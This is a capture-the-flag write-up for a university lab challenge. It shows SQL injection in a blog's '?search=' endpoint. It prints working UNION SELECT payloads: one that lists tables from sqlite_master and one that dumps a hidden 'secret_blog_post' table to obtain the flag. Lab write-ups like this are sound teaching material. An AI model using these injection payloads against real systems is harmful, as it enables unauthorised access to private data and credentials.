# Challenge `Wow, it can't be more juicy than this!` writeup

- Vulnerability:
  - _Endpoint has a **sql** vulnerability_
- Where:
  - _`/?search=` endpoint_
- Impact:
  - _Allows to **obtain the posts content** without having the authority to by making a sql injection in the server's search bar_

## Steps to reproduce

First we need to open a session in the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22261`. After the session is established we will can now start plotting what to do.

Since our objective is to obtain the secret post hidden content, we need to find a way to make the server return the all the posts content. To do this, we need to also know what name the table has, and what type of query is being made.
As usual, we will start by making a bad input to see what the server will return. We will use the following payload:

```sql
' badInput
```

After sending the payload, the server returned the following error message:

```sql
[SQL: SELECT id, title, content FROM blog_post WHERE title LIKE '%'badInput%' OR content LIKE '%'badInput%']
```

So now, we know that there is a table called `blog_post` and that the query is a `SELECT` query. We also know that the server is using the `LIKE` operator to search for the input in the title and content fields.

With this information in mind, we can make a `UNION SELECT` query to find the name of the table we need that has a similar data type (id, title, content). The payload used was:

```sql
_' AND id=1 UNION SELECT 1,tbl_name,3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

After exectuting our malicious query, the server returned three table names: `blog_post`, `user` and `secret_blog_post`. We can conclude that the table we need is `secret_blog_post`.


Now that we know the name of the table, we can make a `UNION SELECT` query to find the content of the secret post. The payload used was:

```sql
_' AND id=1 UNION SELECT id,title,content FROM secret_blog_post--
```

Since we now used the `secret_blog_post` table, the server returned all the information we needed:

```
Reminder
In case I forget my password is: SSof{All_tables_are_vulnerable_with_UNION_constructor}
```

Now, we have found the **hidden blog post** and can access the secret, getting the `flag`.